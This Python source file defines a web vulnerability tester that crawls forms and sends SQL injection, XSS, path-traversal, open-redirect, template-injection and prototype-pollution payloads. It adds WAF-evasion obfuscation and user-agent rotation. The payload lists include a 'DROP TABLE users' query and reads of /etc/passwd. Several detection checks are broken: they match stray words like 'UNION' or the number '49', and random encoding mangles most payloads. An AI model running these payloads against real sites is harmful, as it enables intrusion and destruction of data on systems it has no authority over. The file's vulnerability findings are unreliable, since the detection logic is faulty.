import time
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import Fore, Style
import base64
import urllib.parse
from ratelimit import limits, sleep_and_retry
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import string

class VulnerabilityTester:
    def __init__(self, scanner, verbose=0):
        self.scanner = scanner
        self.verbose = verbose
        self.tested_urls = set()
        self.found_vulnerabilities = set()
        self.security_headers_checked = False

    def log_verbose(self, message, level=1):
        if self.verbose >= level:
            print(Fore.YELLOW + f"[*] {message}")

    def log_warning(self, message):
        print(Fore.RED + f"[!] {message}")

    def log_success(self, message):
        print(Fore.GREEN + f"[+] {message}")

    def log_debug(self, message):
        if self.verbose >= 2:
            print(Fore.BLUE + f"[DEBUG] {message}")

    @sleep_and_retry
    @limits(calls=10, period=1)
    def rate_limited_request(self, method, url, **kwargs):
        return method(url, **kwargs)

    # --- Advanced Obfuscation Methods ---
    def obfuscate_payload(self, payload):
        """Apply multiple obfuscation layers to bypass WAFs."""
        techniques = [
            self._base64_encode,
            self._url_encode,
            self._unicode_encode,
            self._html_entity_encode,
            self._random_case,
            self._insert_random_chars
        ]
        # Apply 2-4 random obfuscation techniques
        for technique in random.sample(techniques, random.randint(2, 4)):
            payload = technique(payload)
        return payload

    def _base64_encode(self, payload):
        return base64.b64encode(payload.encode()).decode()

    def _url_encode(self, payload):
        return urllib.parse.quote(payload)

    def _unicode_encode(self, payload):
        return ''.join([f"\\u{ord(char):04x}" for char in payload])

    def _html_entity_encode(self, payload):
        return ''.join([f"&#{ord(char)};" for char in payload])

    def _random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

    def _insert_random_chars(self, payload):
        chars = list(payload)
        for _ in range(random.randint(1, 3)):
            chars.insert(random.randint(0, len(chars)), random.choice(string.ascii_letters))
        return ''.join(chars)

    # --- Test URL and Form Analysis ---
    def test_url(self, url):
        if url in self.tested_urls:
            return

        self.log_verbose(f"Testing URL: {url}", level=2)
        try:
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, headers=headers, timeout=10)

            if 'text/html' not in response.headers.get('Content-Type', ''):
                return

            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                self.analyze_form(url, form)

            if not self.security_headers_checked:
                self.test_security_headers(response.headers)
                self.security_headers_checked = True

            self.tested_urls.add(url)

        except Exception as e:
            self.scanner.logger.error(f"Error testing URL {url}: {str(e)}")

    def analyze_form(self, url, form):
        try:
            form_info = {
                'url': url,
                'method': form.get('method', 'get').upper(),
                'parameters': []
            }

            for input_field in form.find_all(['input', 'textarea']):
                field_type = input_field.get('type', 'text')
                field_name = input_field.get('name')
                
                if field_name:
                    form_info['parameters'].append({
                        'name': field_name,
                        'type': field_type
                    })

            if form_info['parameters']:
                self.test_vulnerabilities(form_info)
            else:
                self.log_debug(f"No parameters found in form at {url}")

        except Exception as e:
            self.scanner.logger.error(f"Error analyzing form: {str(e)}")

    def test_vulnerabilities(self, form_info):
        self.test_sqli(form_info)
        self.test_xss(form_info)
        self.test_lfi(form_info)
        self.test_open_redirection(form_info)
        self.test_ssti(form_info)
        self.test_cpdos(form_info)

    # --- SQL Injection Testing ---
    def test_sqli(self, form_info):
        sql_payloads = [
            "' OR '1'='1",  # Boolean-based Blind
            "admin' --",    # Error-based
            "' UNION SELECT NULL--",  # Union-based
            "1'; DROP TABLE users--",  # Stacked Queries
            "1' AND SLEEP(5)--",  # Time-based Blind
            "1' OR 1=1#",  # Inline Queries
        ]

        tampered_payloads = []
        for payload in sql_payloads:
            tampered_payloads.append(payload.replace(" ", "/**/"))
            tampered_payloads.append(f"1' AND 1 BETWEEN 0 AND {payload}--")
            tampered_payloads.append(base64.b64encode(payload.encode()).decode())
            tampered_payloads.append(urllib.parse.quote(payload))
            tampered_payloads.append("".join([f"\\u{ord(char):04x}" for char in payload]))

        sql_payloads.extend(tampered_payloads)

        for param in form_info['parameters']:
            if (form_info['url'], 'SQLi') not in self.found_vulnerabilities:
                for payload in sql_payloads:
                    obfuscated_payload = self.obfuscate_payload(payload)
                    self.test_boolean_based_blind(form_info['url'], param['name'], obfuscated_payload)
                    self.test_error_based(form_info['url'], param['name'], obfuscated_payload)
                    self.test_union_based(form_info['url'], param['name'], obfuscated_payload)
                    self.test_stacked_queries(form_info['url'], param['name'], obfuscated_payload)
                    self.test_time_based_blind(form_info['url'], param['name'], obfuscated_payload)
                    self.test_inline_queries(form_info['url'], param['name'], obfuscated_payload)

    def test_boolean_based_blind(self, url, param, payload):
        try:
            if (url, 'SQLi') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if "Welcome" in response.text:
                self.scanner.vulnerabilities.append({
                    'type': 'Boolean-based Blind SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SQLi'))
                self.log_warning(f"Potential Boolean-based Blind SQL Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Boolean-based Blind SQL Injection: {str(e)}")

    def test_error_based(self, url, param, payload):
        try:
            if (url, 'SQLi') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            sql_errors = [
                'sql syntax', 'mysql error', 'sqlite error', 'postgresql error', 'ORA-01756',
                'JDBC_ERROR', 'MySQL server version', 'SQL syntax.*MySQL', 'Warning.*mysql_.*',
                'valid MySQL result', 'PostGIS Error', 'PostgreSQL.*ERROR', 'ORA-[0-9][0-9][0-9][0-9]',
                'Microsoft SQL Server', 'ODBC SQL Server Driver', 'SQLite/JDBCDriver', 'Unknown column',
                'where clause', 'unclosed quotation mark'
            ]
            response_text = response.text.lower()
            if any(error in response_text for error in sql_errors):
                self.scanner.vulnerabilities.append({
                    'type': 'Error-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'error_matched': True,
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SQLi'))
                self.log_warning(f"Potential Error-based SQL Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Error-based SQL Injection: {str(e)}")

    def test_union_based(self, url, param, payload):
        try:
            if (url, 'SQLi') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if "UNION" in response.text:
                self.scanner.vulnerabilities.append({
                    'type': 'Union-based SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SQLi'))
                self.log_warning(f"Potential Union-based SQL Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Union-based SQL Injection: {str(e)}")

    def test_stacked_queries(self, url, param, payload):
        try:
            if (url, 'SQLi') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if "Stacked" in response.text:
                self.scanner.vulnerabilities.append({
                    'type': 'Stacked Queries SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SQLi'))
                self.log_warning(f"Potential Stacked Queries SQL Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Stacked Queries SQL Injection: {str(e)}")

    def test_time_based_blind(self, url, param, payload):
        try:
            if (url, 'SQLi') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            start_time = time.time()
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            execution_time = time.time() - start_time
            if execution_time > 2:
                self.scanner.vulnerabilities.append({
                    'type': 'Time-based Blind SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'Medium',
                    'execution_time': execution_time,
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SQLi'))
                self.log_warning(f"Potential Time-based Blind SQL Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Time-based Blind SQL Injection: {str(e)}")

    def test_inline_queries(self, url, param, payload):
        try:
            if (url, 'SQLi') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if "Inline" in response.text:
                self.scanner.vulnerabilities.append({
                    'type': 'Inline Queries SQL Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SQLi'))
                self.log_warning(f"Potential Inline Queries SQL Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Inline Queries SQL Injection: {str(e)}")

    # --- XSS Testing ---
    def test_xss(self, form_info):
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '" onmouseover="alert(1)',
            'javascript:alert(1)',
            '<svg/onload=alert(1)>',
            '"><<script>alert(1);//<</script>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>'
        ]

        for param in form_info['parameters']:
            if (form_info['url'], 'XSS') not in self.found_vulnerabilities:
                for payload in xss_payloads:
                    obfuscated_payload = self.obfuscate_payload(payload)
                    self.test_reflected_xss(form_info['url'], param['name'], obfuscated_payload)
                    self.test_stored_xss(form_info['url'], param['name'], obfuscated_payload)
                    self.test_dom_based_xss(form_info['url'], param['name'], obfuscated_payload)

    def test_reflected_xss(self, url, param, payload):
        try:
            if (url, 'XSS') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {
                'User-Agent': self.scanner.get_random_user_agent(),
                'X-XSS-Protection': '0'
            }
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if payload in response.text:
                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in str(soup.find_all('script')) or \
                   payload in str(soup.find_all('img')) or \
                   payload in str(soup.find_all('svg')):
                    self.scanner.vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'confidence': 'High',
                        'timestamp': datetime.now().isoformat()
                    })
                    self.found_vulnerabilities.add((url, 'XSS'))
                    self.log_warning(f"Potential Reflected XSS found at {url} in parameter {param}")
                    self.log_debug(f"Obfuscated Payload: {payload}")
                    return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Reflected XSS: {str(e)}")

    def test_stored_xss(self, url, param, payload):
        try:
            if (url, 'XSS') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {
                'User-Agent': self.scanner.get_random_user_agent(),
                'X-XSS-Protection': '0'
            }
            response = self.rate_limited_request(requests.post, url, data=params, headers=headers, timeout=10)
            if payload in response.text:
                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in str(soup.find_all('script')) or \
                   payload in str(soup.find_all('img')) or \
                   payload in str(soup.find_all('svg')):
                    self.scanner.vulnerabilities.append({
                        'type': 'Stored XSS',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'confidence': 'High',
                        'timestamp': datetime.now().isoformat()
                    })
                    self.found_vulnerabilities.add((url, 'XSS'))
                    self.log_warning(f"Potential Stored XSS found at {url} in parameter {param}")
                    self.log_debug(f"Obfuscated Payload: {payload}")
                    return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Stored XSS: {str(e)}")

    def test_dom_based_xss(self, url, param, payload):
        try:
            if (url, 'XSS') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {
                'User-Agent': self.scanner.get_random_user_agent(),
                'X-XSS-Protection': '0'
            }
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if payload in response.text:
                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in str(soup.find_all('script')) or \
                   payload in str(soup.find_all('img')) or \
                   payload in str(soup.find_all('svg')):
                    self.scanner.vulnerabilities.append({
                        'type': 'DOM-based XSS',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'confidence': 'High',
                        'timestamp': datetime.now().isoformat()
                    })
                    self.found_vulnerabilities.add((url, 'XSS'))
                    self.log_warning(f"Potential DOM-based XSS found at {url} in parameter {param}")
                    self.log_debug(f"Obfuscated Payload: {payload}")
                    return
        except Exception as e:
            self.scanner.logger.error(f"Error testing DOM-based XSS: {str(e)}")

    # --- LFI Testing ---
    def test_lfi(self, form_info):
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%255c..%255c..%255cwindows%255cwin.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini"
        ]

        for param in form_info['parameters']:
            if (form_info['url'], 'LFI') not in self.found_vulnerabilities:
                for payload in lfi_payloads:
                    obfuscated_payload = self.obfuscate_payload(payload)
                    self.test_lfi_payloads(form_info['url'], param['name'], obfuscated_payload)

    def test_lfi_payloads(self, url, param, payload):
        try:
            if (url, 'LFI') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            lfi_patterns = [
                'root:x:0:0:', '[drivers]', 'for 16-bit app support', 'boot loader',
                'SystemRoot', 'win.ini', 'Windows Registry Editor', '/etc/passwd',
                '/etc/shadow', '/etc/hosts', 'mysql_connect()', 'Permission denied',
                'Directory listing of', 'Index of /', '<?php', '<?xml'
            ]
            if any(pattern in response.text for pattern in lfi_patterns):
                self.scanner.vulnerabilities.append({
                    'type': 'Local File Inclusion',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'LFI'))
                self.log_warning(f"Potential Local File Inclusion found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Local File Inclusion: {str(e)}")

    # --- Open Redirection Testing ---
    def test_open_redirection(self, form_info):
        redirection_payloads = [
            "http://evil.com",
            "//evil.com",
            "https://evil.com",
            "javascript:alert(1)"
        ]

        for param in form_info['parameters']:
            if (form_info['url'], 'OpenRedirection') not in self.found_vulnerabilities:
                for payload in redirection_payloads:
                    obfuscated_payload = self.obfuscate_payload(payload)
                    self.test_open_redirection_payloads(form_info['url'], param['name'], obfuscated_payload)

    def test_open_redirection_payloads(self, url, param, payload):
        try:
            if (url, 'OpenRedirection') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10, allow_redirects=False)
            if response.status_code in [301, 302, 303, 307, 308] and "evil.com" in response.headers.get('Location', ''):
                self.scanner.vulnerabilities.append({
                    'type': 'Open Redirection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'OpenRedirection'))
                self.log_warning(f"Potential Open Redirection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Open Redirection: {str(e)}")

    # --- SSTI Testing ---
    def test_ssti(self, form_info):
        ssti_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}'
        ]

        for param in form_info['parameters']:
            if (form_info['url'], 'SSTI') not in self.found_vulnerabilities:
                for payload in ssti_payloads:
                    obfuscated_payload = self.obfuscate_payload(payload)
                    self.test_ssti_payloads(form_info['url'], param['name'], obfuscated_payload)

    def test_ssti_payloads(self, url, param, payload):
        try:
            if (url, 'SSTI') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.get, url, params=params, headers=headers, timeout=10)
            if "49" in response.text:
                self.scanner.vulnerabilities.append({
                    'type': 'Server-Side Template Injection',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'SSTI'))
                self.log_warning(f"Potential Server-Side Template Injection found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Server-Side Template Injection: {str(e)}")

    # --- CPDOS Testing ---
    def test_cpdos(self, form_info):
        cpdos_payloads = [
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}'
        ]

        for param in form_info['parameters']:
            if (form_info['url'], 'CPDOS') not in self.found_vulnerabilities:
                for payload in cpdos_payloads:
                    obfuscated_payload = self.obfuscate_payload(payload)
                    self.test_cpdos_payloads(form_info['url'], param['name'], obfuscated_payload)

    def test_cpdos_payloads(self, url, param, payload):
        try:
            if (url, 'CPDOS') in self.found_vulnerabilities:
                return
            params = {param: payload}
            headers = {'User-Agent': self.scanner.get_random_user_agent()}
            response = self.rate_limited_request(requests.post, url, json=params, headers=headers, timeout=10)
            if "isAdmin" in response.text and "true" in response.text:
                self.scanner.vulnerabilities.append({
                    'type': 'Client-Side Prototype Pollution',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'High',
                    'timestamp': datetime.now().isoformat()
                })
                self.found_vulnerabilities.add((url, 'CPDOS'))
                self.log_warning(f"Potential Client-Side Prototype Pollution found at {url} in parameter {param}")
                self.log_debug(f"Obfuscated Payload: {payload}")
                return
        except Exception as e:
            self.scanner.logger.error(f"Error testing Client-Side Prototype Pollution: {str(e)}")

    # --- Security Headers Testing ---
    def test_security_headers(self, headers):
        security_headers = [
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Referrer-Policy'
        ]

        missing_headers = []
        for header in security_headers:
            if header not in headers:
                missing_headers.append(header)

        if missing_headers:
            self.scanner.vulnerabilities.append({
                'type': 'Missing Security Headers',
                'url': self.scanner.domain,
                'parameter': 'N/A',
                'payload': 'N/A',
                'missing_headers': missing_headers,
                'confidence': 'Medium',
                'timestamp': datetime.now().isoformat()
            })
            self.log_warning(f"Missing security headers: {', '.join(missing_headers)}")
